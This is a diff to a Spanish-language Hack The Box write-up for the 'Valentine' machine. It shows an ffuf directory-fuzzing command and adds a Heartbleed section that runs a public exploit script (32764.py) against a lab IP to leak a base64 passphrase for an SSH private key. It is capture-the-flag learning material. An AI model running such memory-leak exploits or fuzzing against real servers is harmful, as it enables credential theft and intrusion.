@@ -53,6 +53,25 @@ Esta herramienta tienen cosas buenas como la de todas las respuestas seria bueno
 ffuf -r -fc 404 -fs 3861 -t 1000  -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://10.129.75.0:3000/api/FUZZ # la -r es para segur las redirecciones.
 ```
 
+## Dirbuster
+
+```
+
+```
+
+## HeartBleed
+
+5![image](https://github.com/gecr07/Valentine-HTB/assets/63270579/39f7244d-1973-49c3-b9a6-a47c286cfc89)
+
+
+Nos damos cuenta que es un servidor viejo vulnerable a heartbleed entonces pues probamos el exploit y nos trae una cadena en base64 que es el paass de la key id_rsa
+
+```
+pythn2 32764.py 10.129.71.228 -p 443 | grep -v "00"
+
+```
+
+
 
 
 
